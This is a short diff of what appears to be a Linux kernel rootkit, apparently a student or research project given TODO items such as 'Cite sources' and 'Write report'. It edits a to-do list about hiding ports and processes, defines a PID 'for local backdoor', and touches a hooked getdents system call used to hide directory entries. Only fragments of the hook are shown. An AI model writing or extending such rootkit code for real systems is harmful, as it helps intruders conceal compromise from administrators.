@@ -12,9 +12,10 @@
 
 // TODO 
 // Hide ports
-// Hide from lsmod
 // Cite sources
 // Write report
+// Bug fix in getdents
+// Better proc hiding
 
 // for local backdoor
 #define LOCAL_PID 12345
@@ -94,7 +95,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent *d;
 
-	// run real getdents
+	// run real getdents 
 	result = (*orig_getdents)(fd,dirp,count);
 
 	// copy from user to kernelspace;
